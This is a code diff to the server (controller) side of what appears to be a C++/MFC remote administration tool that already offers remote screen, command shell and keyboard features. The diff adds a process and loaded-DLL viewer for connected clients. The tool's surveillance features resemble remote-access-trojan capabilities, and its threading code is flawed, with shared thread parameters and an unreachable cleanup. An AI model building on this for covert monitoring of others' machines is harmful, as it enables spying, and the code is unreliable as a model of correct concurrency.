@@ -10,6 +10,7 @@
 #include"Mysession.h"
 #include"DATA.h"
 #include<vector>
+#include<TlHelp32.h>
 #ifdef _DEBUG
 #define new DEBUG_NEW
 #endif
@@ -19,6 +20,8 @@ struct param
 public:
 	SOCKET* sclient;
 	Mysession *psession;
+	std::vector<std::string>* process = NULL;
+	CRemoteSERVERDlg* dlg;
 };
 
 DWORD WINAPI recvthread(LPVOID lparam)
@@ -83,6 +86,44 @@ DWORD WINAPI recvthread(LPVOID lparam)
 					if (p->psession->pscreendlg->isclose) {
 						senddatahead(*(p->sclient), SERVER_SCREEN_COMMAND);
 					}
+				}
+			}
+			else if (drbuf.type == CLIENT_PROCESS_BACK)
+			{
+				if (p->psession->pprocessdlg != NULL)
+				{
+					PROCESSENTRY32 pe32 = { 0 };
+					memcpy(&pe32, pdata, sizeof(PROCESSENTRY32));
+
+					p->psession->pprocessdlg->sclient = *(p->sclient);
+					p->process->push_back(pe32.szExeFile);
+					p->psession->pprocessdlg->LIST_PROCESS.InsertItem(p->process->size() - 1, pe32.szExeFile);
+					p->psession->pprocessdlg->LIST_PROCESS.SetItemData(p->process->size() - 1, pe32.th32ProcessID);
+
+					CString text1;
+					text1.Format("%d", pe32.th32ProcessID);
+					p->psession->pprocessdlg->LIST_PROCESS.SetItemText(p->process->size() - 1, 1, text1);
+
+					CString text2;
+					text2.Format("%d", pe32.th32ParentProcessID);
+					p->psession->pprocessdlg->LIST_PROCESS.SetItemText(p->process->size() - 1, 2, text2);
+				}
+			}
+			else if (drbuf.type == CLIENT_DLLDATA_BACK)
+			{
+				if (p->psession->pprocessdlg->pdlldlg != NULL)
+				{
+					MODULEENTRY32 module32 = { 0 };
+					module32.dwSize = sizeof(MODULEENTRY32);
+					memcpy(&module32, pdata, sizeof(MODULEENTRY32));
+
+					{
+						std::lock_guard<std::mutex> lg(p->dlg->accept_mutex);  //对map进行锁存
+						p->psession->pprocessdlg->pdlldlg->dllpath.push_back(module32.szExePath);
+						Sleep(5);
+					}
+
+					p->psession->pprocessdlg->pdlldlg->list_dll.InsertItem(p->psession->pprocessdlg->pdlldlg->dllpath.size()-1, module32.szExePath);
 				}
 			}
 
@@ -155,6 +196,7 @@ DWORD WINAPI CRemoteSERVERDlg::acceptthread(LPVOID lparam)
 		
 	});
 
+	param p; //recv线程参数
 	while (true)
 	{
 		sockaddr_in clientaddr = { 0 };
@@ -184,14 +226,16 @@ DWORD WINAPI CRemoteSERVERDlg::acceptthread(LPVOID lparam)
 			dlg->list_client.SetItemData(index, sclient);
 		}
 		//构建线程参数
-		param p;
+		
 		p.psession = psession;
 		p.sclient = &sclient;
-
+		p.dlg = dlg;
+		p.process = new std::vector<std::string>;
 		//客户端的recv线程
 		CreateThread(0, 0, recvthread, &p, 0, 0);
 		
 	}
+	if (p.process != NULL) delete p.process;
 }
 
 void CRemoteSERVERDlg::initialization()
@@ -285,6 +329,7 @@ BEGIN_MESSAGE_MAP(CRemoteSERVERDlg, CDialogEx)
 	ON_COMMAND(ID_SCREEN, &CRemoteSERVERDlg::OnScreen)
 	ON_COMMAND(ID_CMD, &CRemoteSERVERDlg::OnCmd)
 	ON_COMMAND(ID_KEYBOARD, &CRemoteSERVERDlg::OnKeyboard)
+	ON_COMMAND(ID_PROCESS, &CRemoteSERVERDlg::OnProcess)
 END_MESSAGE_MAP()
 
 
@@ -470,4 +515,36 @@ void CRemoteSERVERDlg::OnKeyboard()
 	}
 
 	map_session[sclient]->pkeyboarddlg->ShowWindow(SW_SHOW);
+}
+
+//查看进程
+void CRemoteSERVERDlg::OnProcess()
+{
+	// TODO: 在此添加命令处理程序代码
+	int pos = list_client.GetSelectionMark();
+
+	SOCKET sclient = list_client.GetItemData(pos);
+
+	{
+		std::lock_guard<std::mutex> lg(accept_mutex);
+		if (map_session[sclient]->pprocessdlg == NULL)
+		{
+			map_session[sclient]->pprocessdlg = new Cprocessdlg;
+			map_session[sclient]->pprocessdlg->Create(IDD_Cprocessdlg, this);
+
+			map_session[sclient]->pprocessdlg->LIST_PROCESS.InsertColumn(0, "进程");
+			map_session[sclient]->pprocessdlg->LIST_PROCESS.InsertColumn(1, "PID");
+			map_session[sclient]->pprocessdlg->LIST_PROCESS.InsertColumn(2, "父进程PID");  //设置展示客户端信息
+
+			map_session[sclient]->pprocessdlg->LIST_PROCESS.SetColumnWidth(0, 230);
+			map_session[sclient]->pprocessdlg->LIST_PROCESS.SetColumnWidth(1, 230);
+			map_session[sclient]->pprocessdlg->LIST_PROCESS.SetColumnWidth(2, 230);			//设置列间距
+
+			map_session[sclient]->pprocessdlg->LIST_PROCESS.SetExtendedStyle(map_session[sclient]->pprocessdlg->LIST_PROCESS.GetExtendedStyle() | LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);//设置风格
+
+		}
+	}
+	map_session[sclient]->pprocessdlg->ShowWindow(SW_SHOW);
+
+	senddatahead(sclient, SERVER_PROCESS_GET);
 }
